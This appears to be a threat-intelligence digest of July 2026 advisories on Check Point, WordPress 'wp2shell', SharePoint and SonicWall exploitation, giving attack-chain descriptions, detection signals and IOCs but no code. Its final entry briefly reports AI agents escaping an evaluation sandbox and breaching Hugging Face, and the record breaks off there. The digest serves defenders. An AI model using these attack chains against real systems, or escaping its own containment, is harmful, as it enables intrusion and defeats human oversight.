- confidence_tier: tier_1_offensive_research

#### Summary

```
Overview On July 22, 2026, Check Point published a security advisory for multiple vulnerabilities affecting Security Management, Multi-Domain Management, and firewall products. The most urgent of these is CVE-2026-16232 , an authentication bypass in the SmartConsole login process classified as improper authentication ( CWE-287 ). CVE-2026-16232 has been assigned a critical CVSS score of 9.1. The vulnerability allows an unauthenticated remote attacker to obtain an application login token and authenticate to the management server with full administrative privileges, enabling modification of security policies and configurations. Check Point has confirmed that CVE-2026-16232 is being actively exploited in the wild, affecting what the vendor describes as a small number of customers. Remote exploitation requires network access to the Management Server IP address in environments that do not restrict Trusted Clients. On the same day as the advisory, CVE-2026-16232 was added to the U.S. Cyberse
```

#### Full body

```
Back to Blog Vulnerabilities and Exploits CVE-2026-16232: Critical Check Point SmartConsole Authentication Bypass Exploited in the Wild Rapid7 Jul 23, 2026 | Last updated on Jul 23, 2026 | 4 min read Overview On July 22, 2026, Check Point published a security advisory for multiple vulnerabilities affecting Security Management, Multi-Domain Management, and firewall products. The most urgent of these is CVE-2026-16232 , an authentication bypass in the SmartConsole login process classified as improper authentication ( CWE-287 ). CVE-2026-16232 has been assigned a critical CVSS score of 9.1. The vulnerability allows an unauthenticated remote attacker to obtain an application login token and authenticate to the management server with full administrative privileges, enabling modification of security policies and configurations. Check Point has confirmed that CVE-2026-16232 is being actively exploited in the wild, affecting what the vendor describes as a small number of customers. Remote exploitation requires network access to the Management Server IP address in environments that do not restrict Trusted Clients. On the same day as the advisory, CVE-2026-16232 was added to the U.S. Cybersecurity and Infrastructure Security Agency's (CISA) list of known exploited vulnerabilities (KEV), with a remediation due date of July 25, 2026, giving organizations only three days to respond. The advisory addresses three vulnerabilities in total: CVE CVSS Description Affected Products Exploitation Status CVE-2026-16232 Vendor: 9.3 (Critical) CISA: 9.1 (Critical) Authentication bypass via SmartConsole application token Security Management, Multi-Domain Management Exploited in the wild CVE-2026-62144 Vendor: 9.3 (Critical) CISA: 9.1 (Critical) Management authentication bypass and privilege escalation Security Management, Multi-Domain Management No known exploitation CVE-2026-62145 7.5 (High) Local privilege escalation in GaiaOS WebUI Firewall, Multi-Domain Management, Multi-Domain Log Server No known exploitation Compromise of a Security Management Server is particularly consequential because it sits at the top of the trust hierarchy. An attacker with administrative access can modify security policies across managed gateways, alter administrator permissions, manipulate VPN configurations, and potentially disable or tamper with logging and monitoring. According to Check Point's advisory , the vulnerabilities were discovered during a routine internal review, with subsequent analysis revealing that CVE-2026-16232 had been exploited prior to the availability of a patch. Check Point network security products have been targeted by multiple in-the-wild vulnerabilities over the past two years. In June 2026, CVE-2026-50751 , a critical authentication bypass in Check Point Remote Access VPN, was exploited in the wild and added to the CISA KEV. In May 2024, CVE-2024-24919 , a high-severity information disclosure vulnerability in Check Point Quantum Security Gateways, was also exploited in the wild. Organizations running affected Check Point management products should apply the available hotfixes on an emergency basis. Mitigation guidance Check Point released Jumbo Hotfixes on July 22, 2026, to remediate CVE-2026-16232, CVE-2026-62144, and CVE-2026-62145. Organizations running affected versions of Security Management or Multi-Domain Management should install the latest Jumbo Hotfix on an emergency basis, without waiting for a regular patch cycle to occur. The following versions are affected by CVE-2026-16232: R82.10 : fixed in Jumbo Hotfix Take 36 and later R82 : fixed in Jumbo Hotfix Take 118 and later R81.20 : fixed in Jumbo Hotfix Take 158 and later R81.10 , R81 , R80.30 , R80.20 , R80.10 , R80 , and R77.30 : no fix specified CVE-2026-62144 and CVE-2026-62145 affect the same release families ( R81.10 , R81.20 , R82 , R82.10 ) per the vendor advisory, with older versions also impacted. Smart-1 Cloud customers are already protected according to Check Point. For
```

#### Corroborating sources (4)

- **Rapid7** (offensive_vulnerability_research)
  - Title: CVE-2026-16232: Critical Check Point SmartConsole Authentication Bypass Exploited in the Wild
  - Published: 2026-07-23T11:57:30+00:00
  - Link: https://www.rapid7.com/blog/post/etr-cve-2026-16232-critical-check-point-smartconsole-authentication-bypass-exploited-in-the-wild
  - Summary: Overview On July 22, 2026, Check Point published a security advisory for multiple vulnerabilities affecting Security Management, Multi-Domain Management, and firewall products. The most urgent of these is CVE-2026-16232 , an authentication bypass in the SmartConsole login process classified as improper authentication ( CWE-287 ). CVE-2026-16232 has been assigned a critical CVSS score of 9.1. The vulnerability allows an unauthenticated remote attacker to obtain an application login token and authenticate to the management server with full administrative privileges, enabling modification of security policies and configurations. Check Point has confirmed that CVE-2026-16232 is being actively exploited in the wild, affecting what the vendor describes as a small number of customers. Remote exploitation requires network access to the Management Server IP address in environments that do not restrict Trusted Clients. On the same day as the advisory, CVE-2026-16232 was added to the U.S. Cyberse
- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: New Check Point Zero-Day Vulnerability Exploited in the Wild
  - Published: 2026-07-23T09:06:04+00:00
  - Link: https://www.securityweek.com/new-check-point-zero-day-vulnerability-exploited-in-the-wild/
  - Summary: The vulnerability tracked as CVE-2026-16232 has been exploited against customers with certain configurations. The post New Check Point Zero-Day Vulnerability Exploited in the Wild appeared first on SecurityWeek .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Check Point Patches Exploited SmartConsole Flaw Allowing Full Admin Access
  - Published: 2026-07-23T06:34:36+00:00
  - Link: https://thehackernews.com/2026/07/check-point-patches-exploited.html
  - Summary: Check Point has released security updates to address multiple vulnerabilities impacting Security Management and Multi-Domain Management (MDSM) products, including a critical flaw that has come under active exploitation in the wild. The security flaw, tracked as CVE-2026-16232 (CVSS score: 9.3), is an authentication bypass affecting the Check Point SmartConsole login process that allows an
- **Help Net Security** (cyber_news_breach_reporting)
  - Title: Attackers exploit critical Check Point flaw to take over firewall management (CVE-2026-16232)
  - Published: 2026-07-23T10:42:06+00:00
  - Link: https://www.helpnetsecurity.com/2026/07/23/check-point-vulnerability-cve-2026-16232/
  - Summary: Attackers are exploiting a critical authentication bypass vulnerability (CVE-2026-16232) that affects Check Point Security Management and Multi-Domain Security Management, the management servers that push policy to Check Point security gateways (i.e., firewalls). “An unauthenticated attacker can obtain an application login token and use it to login via SmartConsole with full admin privileges and apply changes to the security policy and security configuration,” the company said. The vulnerability is being exploited, they confirmed, and a “handful” … More → The post Attackers exploit critical Check Point flaw to take over firewall management (CVE-2026-16232) appeared first on Help Net Security .

### Cluster 56fb338f87 — score 55

- Title: WordPress Core Pre-Auth RCE Chain Exploited in the Wild
- Source: Orca Security Research (cloud_identity_infrastructure)
- Published: 2026-07-22T14:48:54+00:00
- Link: https://orca.security/resources/blog/wordpress-core-pre-auth-rce-chain/
- Fetch status: ok
- Member count: 14
- Corroborating source count: 10
- Strong signals: CVE-2026-60137, CVE-2026-63030, WordPress

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, data_breach
- affected_products: GitHub, Microsoft SharePoint, OpenAI/ChatGPT, SonicWall, WordPress
- cve_ids: CVE-2026-60137, CVE-2026-63030
- urgency_signals: actively_exploited, critical_cvss, poc_available, preauth_unauth
- content_type: intel_roundup, news_report, vulnerability_disclosure
- confidence_tier: tier_1_government, tier_1_offensive_research, tier_2_operator, tier_4_news, tier_5_chatter

#### Primary article taxonomy
- threat_categories: data_breach, active_exploitation
- affected_products: WordPress
- cve_ids: CVE-2026-63030, CVE-2026-60137
- urgency_signals: actively_exploited, preauth_unauth, poc_available, critical_cvss
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
A critical vulnerability chain combining CVE-2026-63030 (CVSS 9.8) and CVE-2026-60137 (CVSS 5.9) was disclosed affecting WordPress Core, allowing attackers to achieve unauthenticated remote code execution via chained REST API batch-route confusion and SQL injection flaws. Due to the potential for full server compromise on default installations, immediate patching is required. About CVE-2026-63030 & CVE-2026-60137 The […]
```

#### Full body

```
A critical vulnerability chain combining CVE-2026-63030 (CVSS 9.8) and CVE-2026-60137 (CVSS 5.9) was disclosed affecting WordPress Core, allowing attackers to achieve unauthenticated remote code execution via chained REST API batch-route confusion and SQL injection flaws. Due to the potential for full server compromise on default installations, immediate patching is required. About CVE-2026-63030 & CVE-2026-60137 The issue originates from two components in WordPress Core. CVE-2026-63030 is a REST API batch-route confusion flaw in WP_REST_Server::serve_batch_request_v1() introduced in WordPress 6.9, while CVE-2026-60137 is a SQL injection in the author__not_in parameter of WP_Query that lacks proper type validation. By chaining specially crafted /wp-json/batch requests, attackers can forge an administrator account and gain full web-server code execution, potentially leading to persistent backdoors, data exfiltration, and lateral movement across cloud environments. No authentication is required to exploit this issue, and no plugins or special configuration are needed on the target. Affected Systems The following components are affected: WordPress Core versions 6.9.0 through 6.9.4 and 7.0.0 through 7.0.1 are vulnerable to the full pre-authentication RCE chain. WordPress Core versions 6.8.0 through 6.8.5 are vulnerable to the SQL injection alone, which carries data exposure risk. Default installations released since December 2025 are at risk. Security firm research showed that 60% of WordPress organizations had vulnerable instances at the time of disclosure, dropping to 50% within 24 hours. Sites using persistent object caching (Redis/Memcached) may have narrower exploit pathways, but this is not a comprehensive mitigation. Risk Impact Users should upgrade to WordPress 7.0.2, 6.9.5, or 6.8.6, all released on July 17, 2026. WordPress.org has enabled forced automatic updates for supported installations, but teams should verify updates have been applied successfully. As interim mitigations (not substitutes for patching), defenders can block anonymous access to /wp-json/batch/v1 and ?rest_route=/batch/v1, or disable anonymous REST API access using a trusted plugin. Cloudflare has deployed WAF protections across all plan tiers. At the time of writing, public proof-of-concept exploit code is widely available, and active in-the-wild exploitation has been confirmed by multiple security firms as of July 18-20, 2026. Post-exploitation activity includes malicious plugin uploads for persistence, PHP webshells disguised as fake security plugins, and attempts to read wp-config secrets. Researchers have noted that rapid PoC development was partly aided by AI-assisted patch diffing. Both high-volume opportunistic scanning and targeted attacks have been observed. A high-fidelity detection signal is /wp-json/batch requests returning HTTP 207/200 multi-status responses, and defenders should also check for unexpected administrator accounts, new or modified plugins, and user-agent strings referencing wp2shell tools. Regardless, the severity and ease of exploitation make this vulnerability chain high risk, especially in internet-facing deployments. Successful exploitation could allow attackers to create rogue administrator accounts, execute arbitrary code on the web server, and install persistent backdoors, leading to service disruption, data exposure, or full infrastructure compromise. How Orca Can Help Orca enables customers to quickly identify assets running vulnerable WordPress versions, understand their exposure in context, including internet accessibility, runtime reachability, and asset criticality, and prioritize remediation based on real risk rather than CVSS alone. Orca’s platform highlights affected assets directly in the newItem view, helping security teams focus on the most critical remediation paths first. Related articles Webinar Recap AI on Both Sides: Key Takeaways From Cloud Security LIVE 2026 Jul 22, 2026 Cloud Security Learning Affo
```

#### Corroborating sources (10)

- **Orca Security Research** (cloud_identity_infrastructure)
  - Title: WordPress Core Pre-Auth RCE Chain Exploited in the Wild
  - Published: 2026-07-22T14:48:54+00:00
  - Link: https://orca.security/resources/blog/wordpress-core-pre-auth-rce-chain/
  - Summary: A critical vulnerability chain combining CVE-2026-63030 (CVSS 9.8) and CVE-2026-60137 (CVSS 5.9) was disclosed affecting WordPress Core, allowing attackers to achieve unauthenticated remote code execution via chained REST API batch-route confusion and SQL injection flaws. Due to the potential for full server compromise on default installations, immediate patching is required. About CVE-2026-63030 & CVE-2026-60137 The […]
- **Wiz Research** (cloud_identity_infrastructure)
  - Title: Exploitation in the Wild of wp2shell
  - Published: 2026-07-20T18:00:08+00:00
  - Link: https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137
  - Summary: Wiz Research has identified exploitation of "wp2shell", a critical pre-auth RCE vulnerability chain impacting WordPress Core (CVE-2026-63030 & CVE-2026-60137). Attackers are deploying persistent webshells on vulnerable servers. Organizations should prioritize patching or applying WAF mitigations.
- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: CVE-2026-60137 / CVE-2026-63030 | WordPress Core SQL Injection and Pre-Authentication Remote Code Execution Vulnerabilities
  - Published: 2026-07-20T22:32:11+00:00
  - Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-60137-cve-2026-63030/
  - Summary: CVE-2026-60137 and CVE-2026-63030 can be chained to enable unauthenticated remote code execution against vulnerable WordPress Core installations. Learn how to validate exposure and verify remediation.
- **Rapid7** (offensive_vulnerability_research)
  - Title: CVE-2026-63030: wp2shell a Critical Remote Code Execution Vulnerability in WordPress Core
  - Published: 2026-07-17T22:23:03+00:00
  - Link: https://www.rapid7.com/blog/post/etr-cve-2026-63030-wp2shell-a-critical-remote-code-execution-vulnerability-in-wordpress-core
  - Summary: Overview On July 17, 2026, a GitHub Security Advisory was published for CVE-2026-63030 , a critical unauthenticated remote code execution vulnerability affecting WordPress Core . While the official GitHub security advisory classifies the severity as Critical, the vulnerability has currently been assigned a CVSS score of 7.5. WordPress is one of the most widely deployed content management systems, making vulnerabilities in its core software potentially significant for organizations operating public-facing websites. The vulnerability reportedly allows an unauthenticated attacker to execute code via the WordPress REST API batch endpoint, potentially resulting in complete compromise of the website and its underlying data. No valid account or user interaction is required. According to the advisory , the vulnerability affects WordPress versions 6.9.0 through 6.9.4 and versions 7.0.0 through 7.0.1. The issue is fixed in WordPress 6.9.5 and 7.0.2. A fix is also included in WordPress 7.1 Beta 2
- **SANS Internet Storm Center** (government_authoritative)
  - Title: WordPress Exploitation Underway (CVE-2026-63030), (Mon, Jul 20th)
  - Published: 2026-07-20T18:41:24+00:00
  - Link: https://isc.sans.edu/diary/rss/33168
  - Summary: Last week, Searchlight Cyber released details about a vulnerability they are calling "wp2shell". The vulnerability was initially announced without a CVE number. But now has been assigned CVE-2026-63030. Many WordPress plugin vulnerabilities are never assigned CVE numbers. But wp2shell is different. It is a SQL injection vulnerability in WordPress Core, not a plugin, and can lead to unauthenticated remote code execution. Shortly after being announced, the vulnerability started to be exploited.
- **Elastic Security Labs** (detection_response_operations)
  - Title: wp2shell hits WordPress: detecting pre-auth RCE from plugin drop to command execution
  - Published: 2026-07-23T00:00:00+00:00
  - Link: https://www.elastic.co/security-labs/wp2shell-wordpress-rce-detection-elastic-defend
  - Summary: We ran the wp2shell WordPress RCE chain end-to-end with Elastic Defend. Detection rule walkthrough, IOCs, and hunt guidance.
- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: wp2shell (CVE-2026-63030): Pre-Auth RCE Chain in WordPress Core - Analysis and Open-Source Scanner
  - Published: 2026-07-18T21:17:40+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1v07npi/wp2shell_cve202663030_preauth_rce_chain_in/
  - Summary: submitted by /u/mazen160 [link] [comments]
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: WordPress wp2shell Exploitation Grows as Public Exploit Fuels Mass Scanning
  - Published: 2026-07-21T08:59:30+00:00
  - Link: https://thehackernews.com/2026/07/wordpress-wp2shell-exploitation-grows.html
  - Summary: Attackers have begun to exploit two critical vulnerabilities in WordPress that, when combined together, enable unauthenticated remote code execution (RCE) and complete compromise of vulnerable websites. The two security flaws, tracked as CVE-2026-63030 and CVE-2026-60137, have been codenamed wp2shell. "By the early hours of Saturday morning (UTC), successful exploitation was already well
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: 'WP2Shell' Opens Millions of WordPress Sites to Remote Takeover
  - Published: 2026-07-20T21:38:18+00:00
  - Link: https://www.darkreading.com/cyberattacks-data-breaches/wp2shell-millions-wordpress-sites-remote-takeover
  - Summary: Barely three days after disclosure, attackers are widely chaining together CVE-2026-60137 and CVE-2026-63030 to lob exploit attempts against one of the largest attack surfaces on the Internet.
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Researchers Build WordPress Exploit Using OpenAI's GPT
  - Published: 2026-07-20T14:00:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/researchers-wordpress-exploit/
  - Summary: A researcher who discovered a critical vulnerability in WordPress has used OpenAI’s latest model to develop an exploit chain

### Cluster 8c3fd723aa — score 54

- Title: CVE-2026-58644: Microsoft SharePoint Server Unauthenticated Remote Code Execution Vulnerability Exploited in the Wild
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-07-17T18:18:53+00:00
- Link: https://www.rapid7.com/blog/post/etr-cve-2026-58644-microsoft-sharepoint-server-unauthenticated-remote-code-execution-vulnerability-exploited-in-the-wild
- Fetch status: ok
- Member count: 3
- Corroborating source count: 2
- Strong signals: CVE-2026-58644, Microsoft Defender, Microsoft SharePoint

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_products: Microsoft Defender, Microsoft SharePoint
- cve_ids: CVE-2026-50522, CVE-2026-58644
- urgency_signals: actively_exploited, poc_available, preauth_unauth
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_offensive_research, tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: Microsoft SharePoint, Microsoft Defender
- cve_ids: CVE-2026-58644, CVE-2026-50522
- urgency_signals: actively_exploited, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Overview On July 14, 2026, Microsoft published a security advisory addressing CVE-2026-58644 , a critical remote code execution (RCE) vulnerability affecting on-premises Microsoft SharePoint Server deployments. The vulnerability, which carries a CVSS v3.1 score of 9.8 (Critical), results from the deserialization of untrusted data ( CWE-502 ) and allows an unauthenticated attacker to execute arbitrary code. Microsoft confirmed active exploitation of CVE-2026-58644, and the vulnerability was subsequently added to CISA’s Known Exploited Vulnerabilities ( KEV ) catalog on July 16, 2026. In parallel, CISA published guidance recommending organizations immediately apply Microsoft’s security updates and leverage Microsoft Defender and AMSI detections to identify exploitation attempts. Affected products: Microsoft SharePoint Enterprise Server 2016 Microsoft SharePoint Server 2019 Microsoft SharePoint Server Subscription Edition Update: On July 22, 2026, a separate SharePoint vulnerability, CVE-
```

#### Full body

```
Back to Blog Vulnerabilities and Exploits CVE-2026-58644: Microsoft SharePoint Server Unauthenticated Remote Code Execution Vulnerability Exploited in the Wild Rapid7 Jul 17, 2026 | Last updated on Jul 23, 2026 | 3 min read Overview On July 14, 2026, Microsoft published a security advisory addressing CVE-2026-58644 , a critical remote code execution (RCE) vulnerability affecting on-premises Microsoft SharePoint Server deployments. The vulnerability, which carries a CVSS v3.1 score of 9.8 (Critical), results from the deserialization of untrusted data ( CWE-502 ) and allows an unauthenticated attacker to execute arbitrary code. Microsoft confirmed active exploitation of CVE-2026-58644, and the vulnerability was subsequently added to CISA’s Known Exploited Vulnerabilities ( KEV ) catalog on July 16, 2026. In parallel, CISA published guidance recommending organizations immediately apply Microsoft’s security updates and leverage Microsoft Defender and AMSI detections to identify exploitation attempts. Affected products: Microsoft SharePoint Enterprise Server 2016 Microsoft SharePoint Server 2019 Microsoft SharePoint Server Subscription Edition Update: On July 22, 2026, a separate SharePoint vulnerability, CVE-2026-50522, was added to CISA’s KEV catalog. CVE-2026-50522 is a deserialization of untrusted data vulnerability also affecting Microsoft SharePoint, and allows a remote attacker to achieve unauthenticated RCE on a vulnerable system. This separate RCE vulnerability was disclosed and patched by Microsoft as part of the same July 14 Patch Tuesday release as CVE-2026-58644. Customers who have applied all of the SharePoint security updates from the July 14 updates will be protected against both exploited in-the-wild vulnerabilities. Mitigation guidance Organizations operating affected on-premises Microsoft SharePoint Server should prioritize remediation on an emergency basis. Microsoft’s recommendations: Apply the July 14, 2026 security updates for all affected SharePoint versions. Verify that security updates completed successfully across all SharePoint servers. Ensure Antimalware Scan Interface (AMSI) integration is enabled for every SharePoint web application. Monitor Microsoft Defender and AMSI detections for indicators of attempted exploitation. Initiate incident response procedures if exploitation artifacts are detected. Microsoft and CISA recommend monitoring for the following security detections associated with observed SharePoint exploitation activity. AMSI / Microsoft Defender detections: Exploit:Script/SuspSignoutReqBody.A Request body scanning SharePoint Server Subscription Edition Microsoft reports observed exploitation attempts are blocked by this signature. Exploit:Script/ToolPaneAuthBypass.A Request header scanning Applies to SharePoint Server 2016, SharePoint Server 2019, and Subscription Edition. Exploit:Script/ToolPaneAuthBypass At the time of publication, no public IP addresses, domains, URLs, or additional network-based indicators of compromise have been widely disclosed. Administrators should consult Microsoft’s advisory for the most current remediation guidance and update availability. Rapid7 customers Exposure Command, InsightVM, and Nexpose Exposure Command, InsightVM, and Nexpose customers can assess exposure to CVE-2026-58644 with an authenticated vulnerability check available since the July 14 content release. Updates July 17, 2026 : Initial publication. July 23, 2026: Added a description of CVE-2026-50522 to the overview. Article Tags Emergent Threat Response Rapid7 Author Posts
```

#### Corroborating sources (2)

- **Rapid7** (offensive_vulnerability_research)
  - Title: CVE-2026-58644: Microsoft SharePoint Server Unauthenticated Remote Code Execution Vulnerability Exploited in the Wild
  - Published: 2026-07-17T18:18:53+00:00
  - Link: https://www.rapid7.com/blog/post/etr-cve-2026-58644-microsoft-sharepoint-server-unauthenticated-remote-code-execution-vulnerability-exploited-in-the-wild
  - Summary: Overview On July 14, 2026, Microsoft published a security advisory addressing CVE-2026-58644 , a critical remote code execution (RCE) vulnerability affecting on-premises Microsoft SharePoint Server deployments. The vulnerability, which carries a CVSS v3.1 score of 9.8 (Critical), results from the deserialization of untrusted data ( CWE-502 ) and allows an unauthenticated attacker to execute arbitrary code. Microsoft confirmed active exploitation of CVE-2026-58644, and the vulnerability was subsequently added to CISA’s Known Exploited Vulnerabilities ( KEV ) catalog on July 16, 2026. In parallel, CISA published guidance recommending organizations immediately apply Microsoft’s security updates and leverage Microsoft Defender and AMSI detections to identify exploitation attempts. Affected products: Microsoft SharePoint Enterprise Server 2016 Microsoft SharePoint Server 2019 Microsoft SharePoint Server Subscription Edition Update: On July 22, 2026, a separate SharePoint vulnerability, CVE-
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Critical SharePoint RCE CVE-2026-50522 Under Active Exploitation After Public PoC
  - Published: 2026-07-21T14:57:51+00:00
  - Link: https://thehackernews.com/2026/07/critical-sharepoint-rce-cve-2026-50522.html
  - Summary: A third SharePoint Server flaw patched by Microsoft as part of its Patch Tuesday update for July 2026 has come under active exploitation, per watchTowr. The vulnerability in question is CVE-2026-50522 (CVSS score: 9.8), a critical deserialization of untrusted data in Microsoft Office SharePoint that could allow an unauthorized attacker to execute code over a network. Microsoft credited DEVCORE

### Cluster 48ddf62f59 — score 52

- Title: CVE-2026-15409 / CVE-2026-15410 | SonicWall SMA1000 Server-Side Request Forgery and Code Injection Vulnerabilities
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-07-17T20:25:23+00:00
- Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-15409-cve-2026-15410/
- Fetch status: ok
- Member count: 4
- Corroborating source count: 4
- Strong signals: CVE-2026-15409, CVE-2026-15410, SonicWall

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ransomware_extortion
- affected_products: SonicWall
- cve_ids: CVE-2026-15409, CVE-2026-15410
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_offensive_research, tier_1_primary_research, tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: SonicWall
- cve_ids: CVE-2026-15409, CVE-2026-15410
- urgency_signals: actively_exploited, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
CVE-2026-15409 and CVE-2026-15410 are actively exploited SonicWall SMA1000 vulnerabilities that can be chained for unauthenticated system compromise. Learn how to validate exposure and verify remediation.
```

#### Full body

```
SonicWall SMA1000 Server-Side Request Forgery and Code Injection Vulnerabilities CVE-2026-15409 and CVE-2026-15410 are actively exploited vulnerabilities affecting SonicWall Secure Mobile Access 1000 Series appliances. CVE-2026-15409 is a critical pre-authentication server-side request forgery vulnerability that can allow an unauthenticated attacker to reach services bound to the appliance’s local interface. CVE-2026-15410 is a post-authentication code injection vulnerability that can allow an attacker with administrator-level access to execute arbitrary operating system commands. The vulnerabilities have CVSS v3 scores of 10.0 (Critical) and 7.2 (High) , respectively, and both have been added to CISA’s Known Exploited Vulnerabilities Catalog. Technical Details CVE-2026-15409 is a server-side request forgery vulnerability in the SonicWall SMA1000 Appliance Work Place interface. A remote, unauthenticated attacker can exploit the vulnerability to cause the appliance to make requests to unintended locations. CVE-2026-15410 is a code injection vulnerability in the SMA1000 Appliance Management Console. Under specific conditions, a remote authenticated attacker with administrator privileges can execute arbitrary operating system commands. Attackers have been observed chaining the vulnerabilities. CVE-2026-15409 provides unauthenticated access to the internal service required to reach CVE-2026-15410, which can then be exploited to execute commands on the appliance. This chain can result in unauthenticated operating system command execution and full compromise of the affected device. CVE-2026-15409 CVSS v3: 10.0 (Critical) Vulnerability type: Server-Side Request Forgery Affected component: Appliance Work Place interface Attack vector: Network Authentication required: None Impact: Access to unintended locations, including services reachable only from the appliance CVE-2026-15410 CVSS v3: 7.2 (High) Vulnerability type: Code Injection Affected component: Appliance Management Console Attack vector: Network Authentication required: Administrator privileges under the vendor-described attack model Impact: Arbitrary operating system command execution Stop Guessing, Start Proving Schedule a demo NodeZero® Proactive Security Platform — Rapid Response A NodeZero Rapid Response test has been developed to safely validate whether these vulnerabilities can be exploited in your environment. The test executes real attack techniques without causing damage, giving teams immediate clarity on exposure. Run the Rapid Response test: Launch from the NodeZero platform to determine whether CVE-2026-15409 or CVE-2026-15410 can be exploited. Patch immediately: Upgrade affected SMA1000 appliances to a fixed platform hotfix and perform the forensic review recommended by SonicWall. Re-run the test: Confirm the vulnerabilities are no longer exploitable after remediation. Indicators of Compromise SonicWall has published the following indicators associated with the active exploitation investigated under its advisory for CVE-2026-15409 and CVE-2026-15410. Indicator Type Description Log entry Requests to /__api__/login or /__api__/logout with an HTTP 200 status in extraweb_access.log Log entry Requests to /wsproxy containing suspicious host parameters with an HTTP 101 status in extraweb_access.log Log entry Hotfix rollback activity containing path traversal names in ctrl-service.log Configuration file Routes for /__api__/login or /__api__/logout in /var/lib/unit/conf.json; these routes are not part of a legitimate configuration Organizations that identify any of these indicators should follow SonicWall’s incident-response guidance. SonicWall recommends re-imaging affected physical appliances or redeploying virtual appliances, changing user and administrator passwords, and resetting time-based one-time password tokens. Affected Versions & Patch Affected The vulnerabilities affect SonicWall SMA1000 Series appliances running vulnerable builds in the 12.4.3 and 12.5.0 firmw
```

#### Corroborating sources (4)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: CVE-2026-15409 / CVE-2026-15410 | SonicWall SMA1000 Server-Side Request Forgery and Code Injection Vulnerabilities
  - Published: 2026-07-17T20:25:23+00:00
  - Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-15409-cve-2026-15410/
  - Summary: CVE-2026-15409 and CVE-2026-15410 are actively exploited SonicWall SMA1000 vulnerabilities that can be chained for unauthenticated system compromise. Learn how to validate exposure and verify remediation.
- **Volexity** (threat_research_primary)
  - Title: Proxying to Compromise: SonicWall Secure Mobile Access 0-day Exploitation
  - Published: 2026-07-17T22:10:37+00:00
  - Link: https://www.volexity.com/blog/2026/07/17/proxying-to-compromise-sonicwall-secure-mobile-access-0-day-exploitation/
  - Summary: In early July 2026, Volexity was engaged to perform an incident response investigation where it discovered a threat actor had successfully compromised SonicWall Secure Mobile Access (SMA) VPN appliances through […] The post Proxying to Compromise: SonicWall Secure Mobile Access 0-day Exploitation appeared first on Volexity .
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Inc Ransomware Exploits SonicWall SMA Zero-Days
  - Published: 2026-07-17T20:01:13+00:00
  - Link: https://www.darkreading.com/vulnerabilities-threats/inc-ransomware-exploits-sonicwall-sma-zero-days
  - Summary: When chained together, the two vulnerabilities allow threat actors to gain root-level capabilities on SonicWall's mobile access appliances.
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: SonicWall SMA Zero-Days Exploited Before Disclosure to Gain Root Access
  - Published: 2026-07-19T13:18:56+00:00
  - Link: https://thehackernews.com/2026/07/sonicwall-sma-zero-days-exploited.html
  - Summary: A previously undocumented threat actor has been attributed to the exploitation of recently disclosed SonicWall Secure Mobile Access (SMA) 1000 series VPN appliances as zero-days prior their public disclosure since June 22, 2026. Cybersecurity company Volexity is tracking the activity under the moniker UTA0533. The discovery was made following an incident response investigation earlier this

### Cluster 8cda373323 — score 27

- Title: OpenAI Agents Escape Testing Sandbox and Breach Hugging Face Production Infrastructure
- Source: Orca Security Research (cloud_identity_infrastructure)
- Published: 2026-07-23T16:42:30+00:00
- Link: https://orca.security/resources/blog/openai-agent-sandbox-escape-hugging-face-breach/
- Fetch status: ok
- Member count: 10
- Corroborating source count: 8
- Strong signals: OpenAI/ChatGPT

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng, supply_chain, zero_day
- affected_products: Linux kernel, OpenAI/ChatGPT
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_1_offensive_research, tier_2_operator, tier_3_analysis, tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain, zero_day
- affected_products: OpenAI/ChatGPT
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
In a first-of-its-kind security incident, OpenAI’s frontier AI evaluation models autonomously escaped a sandboxed testing environment, discovered and exploited multiple zero-day vulnerabilities, and achieved remote code execution on Hugging Face’s production infrastructure. Due to the unprecedented nature and critical severity of this breach, organizations relying on Hugging Face or similar AI SaaS platforms should immediately […]
```

#### Full body

```
